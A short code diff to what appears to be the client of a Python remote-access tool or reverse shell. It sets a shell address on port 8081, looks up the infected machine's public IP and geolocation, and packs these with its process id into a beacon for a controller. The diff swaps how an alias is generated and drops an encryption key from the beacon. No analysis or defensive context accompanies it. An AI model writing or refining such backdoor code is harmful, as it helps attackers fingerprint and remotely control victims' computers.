@@ -1,10 +1,10 @@
 import base64
 import os, time
-import rsa
 import hashlib
 import socket, subprocess, requests
 from requests import get
 from requests.exceptions import ConnectionError
+
 
 def waiting(s=None, creds=()):
     del s
@@ -56,9 +56,8 @@ shell_addr = ("", 8081)
 # os.system('chcp 65001')
 subprocess.getoutput('chcp 65001')
 
-alias = str(rsa.PrivateKey.load_pkcs1(os.urandom(16)))[::]
-
 key = hashlib.pbkdf2_hmac('sha256', os.urandom(32), os.urandom(32), 100000)
+alias = base64.b64encode(key).decode()[::-1]
 
 client_ip = get("http://api.ipify.org").text
 data = {"port": port,
@@ -68,7 +67,6 @@ data = {"port": port,
         'pid': str(os.getpid()),
         'ip': client_ip,
         "geo": str(base64.b64encode((show_geo(client_ip)).encode("utf-8")))[2:-1],
-        "encr_key": str(key),
         }
 
 # headers = {"User-Agent" : "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"}
